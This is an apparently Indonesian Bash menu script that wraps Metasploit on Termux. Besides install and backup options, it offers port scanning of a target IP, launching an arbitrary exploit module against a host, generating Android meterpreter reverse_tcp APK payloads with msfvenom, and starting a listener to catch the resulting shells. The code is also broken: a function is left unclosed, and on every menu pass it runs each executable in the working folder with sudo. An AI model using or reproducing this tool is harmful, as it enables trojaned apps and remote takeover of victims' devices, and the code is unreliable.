#!/bin/bash

# Fungsi buat tampilkan header
header() {
  echo "================================="
  echo "         Termux Metasploit"
  echo "================================="
}

# Fungsi buat tampilkan daftar kontributor
kontributor() {
  echo "Daftar Kontributor:"
  echo "- play123oke"
  echo "- Metasploit Community"
  echo "- Open Source Contributors"
}

# Fungsi buat tampilkan update file
update_file() {
  echo "Update File Termux Metasploit:"
  echo "1. msfconsole"
  echo "2. exploits/"
  echo "3. modules/"
  echo "4. scripts/"
}

# Fungsi buat tampilkan versi Metasploit
versi_metasploit() {
  echo "Versi Metasploit:"
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
  for file in *; do 
  if [ -f "$file" ] && [ -x "$file" ]; then
    sudo ./$file install
  fi
done
}

# Fungsi buat tampilkan perintah bantuan
bantuan() {
  echo "Perintah Bantuan:"
  echo "msfconsole -h"
  echo "msfupdate"
}

# Fungsi buat install Metasploit
install_metasploit() {
  echo "Menginstall Metasploit..."
  pkg install -y metasploit
  echo "Metasploit telah diinstall!"
  git clone https://github.com/rapid7/metasploit-framework
  
# Tentukan nama file output
OUTPUT="commit_$(date +'%Y-%m-%d').zip"

# Tentukan file(*) yang akan disatukan
FILES=(
  ".gitignore"
  "Makefile"
  "README.md"
  "bookstore-setup.rb"
  "nokogiri"
  "sysinfo.sh"
  "termuxmetasploit.sh"
  "update-config.guess"
  "update-config.sub"
  ".github/workflows/gem-push.yml"
  "msfconsole"
  "msfupdate"
  "metasploit-framework"
  "setup_ruby"
  "test_memory_usage.rb"
  "new_versions.rb"
  "action.yml"
  "release.rb"
  "rubygem.js"
  "yarn.lock")
for file in *; do
  if [ -f "$file" ] && [ -x "$file" ]; then
     sudo ./$file install
  fi
  done

# Fungsi buat update Metasploit
update_metasploit() {
  echo "Mengupdate Metasploit..."
# Tentukan file(*) yang akan disatukan
FILES=("msfupdate")
  for file in *; do
  if [ -f "$file" ] && [ -x "$file" ]; then
     sudo ./$file install
  fi
  done
  echo "Metasploit telah diupdate!"
}

# Fungsi buat backup Metasploit
backup_metasploit() {
  echo "Membuat backup Metasploit..."
  tar -czf metasploit_backup.tar.gz ~/.msf4/
  echo "Backup telah dibuat!"
}

# Fungsi buat restore Metasploit
restore_metasploit() {
  echo "Merestore Metasploit..."
  tar -xzf metasploit_backup.tar.gz -C ~/.msf4/
  echo "Metasploit telah direstore!"
}

# Fungsi buat hapus Metasploit
hapus_metasploit() {
  echo "Menghapus Metasploit..."
  pkg remove -y metasploit
  echo "Metasploit telah dihapus!"
}

# Fungsi buat scan port
scan_port() {
  echo "Masukkan IP target:"
  read ip
  echo "Masukkan range port (contoh: 1-1000):"
  read port
  nmap -p $port $ip
}

# Fungsi buat exploit
exploit() {
  echo "Masukkan IP target:"
  read ip
  echo "Masukkan port target:"
  read port
  echo "Masukkan exploit (contoh: exploit/multi/handler):"
  read exploit
  msfconsole -q -x "use $exploit; set RHOST $ip; set RPORT $port; exploit"
}

# Fungsi buat payload
payload() {
  echo "Masukkan IP target:"
  read ip
  echo "Masukkan port target:"
  read port
  echo "Masukkan payload (contoh: android/meterpreter/reverse_tcp):"
  read payload
  msfvenom -p $payload LHOST=$ip LPORT=$port -f apk > payload.apk
  echo "Payload telah dibuat!"
}

# Fungsi buat connect ke Metasploit
connect_msf() {
  echo "Masukkan IP Metasploit:"
  read ip
  echo "Masukkan port Metasploit (default: 5554):"
  read port
  msfconsole -q -x "connect $ip $port"
}

# Fungsi buat buat listener
listener() {
  echo "Masukkan payload (contoh: android/meterpreter/reverse_tcp):"
  read payload
  echo "Masukkan IP listener:"
  read ip
  echo "Masukkan port listener:"
  read port
  msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $payload; set LHOST $ip; set LPORT $port; exploit"
}

# Tampilkan menu
while true; do
  header
  kontributor
  update_file
  versi_metasploit
  bantuan
  echo "================================="
  echo "Pilihan:"
  echo "1. Install Metasploit"
  echo "2. Update Metasploit"
  echo "3. Masuk Metasploit"
  echo "4. Backup Metasploit"
  echo "5. Restore Metasploit"
  echo "6. Hapus Metasploit"
  echo "7. Scan Port"
  echo "8. Exploit"
  echo "9. Payload"
  echo "10. Connect ke Metasploit"
  echo "11. Buat Listener"
  echo "12. Keluar"
  read -p "Pilih: " pilihan

  case $pilihan in
    1) install_metasploit ;;
    2) update_metasploit ;;
    3) msfconsole ;;
    4) backup_metasploit ;;
    5) restore_metasploit ;;
    6) hapus_metasploit ;;
    7) scan_port ;;
    8) exploit ;;
    9) payload ;;
    10) connect_msf ;;
    11) listener ;;
    12) exit ;;
    *) echo "Pilihan tidak valid!" ;;
  esac
  echo "kembali ke menu"
done
